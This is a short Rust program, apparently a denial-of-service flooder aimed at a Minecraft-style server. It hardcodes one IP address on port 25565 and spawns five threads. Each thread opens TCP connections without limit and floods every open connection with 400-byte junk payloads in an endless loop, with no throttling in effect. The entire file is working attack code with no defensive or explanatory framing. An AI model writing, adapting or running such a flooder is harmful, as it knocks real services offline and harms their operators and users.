use std::{
    io::Write,
    net::{SocketAddr, TcpStream},
    thread,
    time::Duration,
};

fn main() {
    for _ in 0..4 {
        thread::spawn(|| {
            start_client();
        });
    }
    start_client();
}

fn start_client() {
    const payload: &'static [u8] = &[123; 400];
    let addr: SocketAddr = "158.180.88.171:25565".parse().unwrap();
    struct Player {
        stream: TcpStream,
    }
    const client_amount: usize = 100;
    let mut clients = Vec::<Player>::with_capacity(client_amount);
    let delay = Duration::from_millis(50);
    loop {
        let stream = TcpStream::connect::<SocketAddr>(addr).unwrap();
        clients.push(Player { stream });
        for client in clients.iter_mut() {
            client.stream.write_all(payload).unwrap();
        }
    }
}
